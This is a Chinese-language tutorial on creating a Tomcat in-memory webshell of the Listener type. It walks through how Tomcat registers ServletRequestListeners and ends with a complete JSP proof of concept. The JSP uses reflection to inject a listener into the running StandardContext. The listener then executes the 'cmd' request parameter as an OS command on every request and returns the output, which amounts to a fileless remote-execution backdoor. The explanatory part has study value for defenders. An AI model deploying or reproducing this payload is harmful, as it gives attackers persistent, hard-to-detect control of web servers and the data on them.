# 0x01 Listener First Shoot

1. 引入servlet依赖

   ```xml
   <dependency>
       <groupId>javax.servlet</groupId>
       <artifactId>javax.servlet-api</artifactId>
       <version>4.0.1</version>
   </dependency>
   <dependency>
       <groupId>org.apache.tomcat</groupId>
       <artifactId>tomcat-catalina</artifactId>
       <version>9.0.20</version>
   </dependency>
   ```

2. 创建监听器

对应`Application`、`Session` 和 `Request` 三大对象

监听器有三种：ServletContextListener、HttpSessionListener、ServletRequestListener

由于每次访问都会涉及Request对象的监听，ServletRequestListener监听器最适合作为内存马

这里以`ServletRequestListener`为例，自己定义的监听器需要实现这个接口。

* 自定义监听器

  ```java
  package listeners;
  
  import javax.servlet.ServletRequestEvent;
  import javax.servlet.ServletRequestListener;
  
  public class MyListener implements ServletRequestListener {
      public void requestDestroyed(ServletRequestEvent sre) {
          System.out.println("MyListener is destroyed");
      }
  
      public void requestInitialized(ServletRequestEvent sre) {
          System.out.println("MyListener is initializing");
      }
  }
  ```

* 注册监听器（web.xml）

  ```xml
    <listener>
      <listener-class>listeners.MyListener</listener-class>
    </listener>
  ```

随便发起一次请求，发现控制台有打印



# 0x02 Create Listener Memory Shell

既然要注入Listener型内存马，我们就得思考Listener是怎么被注册到服务的。

我们是在web.xml配置文件中注册的监听器，因此程序肯定首先会读取web.xml这个文件解析里面的内容。在启动应用的时候，ContextConfig类会去读取配置文件

`org.apache.catalina.startup.ContextConfig#configureContext`传入了webxml参数

```java
private void configureContext(WebXml webxml) {
    // .....
    for (String listener : webxml.getListeners()) {
            context.addApplicationListener(listener);
    }
    // .....
}
```

`org.apache.catalina.Context#addApplicationListener`是一个接口，查看其实现类`StandardContext`

```java
public Object[] getApplicationEventListeners() {
    return applicationEventListenersList.toArray();
}
public void addApplicationEventListener(Object listener) {
    applicationEventListenersList.add(listener);
}
public boolean fireRequestInitEvent(ServletRequest request) {
    Object instances[] = getApplicationEventListeners();

    if ((instances != null) && (instances.length > 0)) {
        ServletRequestEvent event =
            new ServletRequestEvent(getServletContext(), request);
        for (int i = 0; i < instances.length; i++) {
            if (instances[i] == null)
                continue;
            if (!(instances[i] instanceof ServletRequestListener))
                continue;
            ServletRequestListener listener =
                (ServletRequestListener) instances[i];

            try {
                listener.requestInitialized(event);
                \\....
            }
            \\...
        }
}
```

通过`StandardContext#addApplicationEventListener`将我们构造的Listener放进去

# 0x03 POC

```jsp
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.IOException" %>

<%!
    public class MyListener implements ServletRequestListener {
        public void requestDestroyed(ServletRequestEvent sre) {}

        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            if (req.getParameter("cmd") != null){
                InputStream in = null;
                try {
                    // cmd /c dir 是执行完dir命令后关闭命令窗口
                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\n");
                    String out = s.hasNext()?s.next():"";
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request)requestF.get(req);
                    // 命令执行结果写回Response
                    request.getResponse().getWriter().write(out);
                }
                catch (IOException e) {}
                catch (NoSuchFieldException e) {}
                catch (IllegalAccessException e) {}
            }
        }
    }
%>

<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
    MyListener myListener = new MyListener();
    context.addApplicationEventListener(myListener);
%>
```

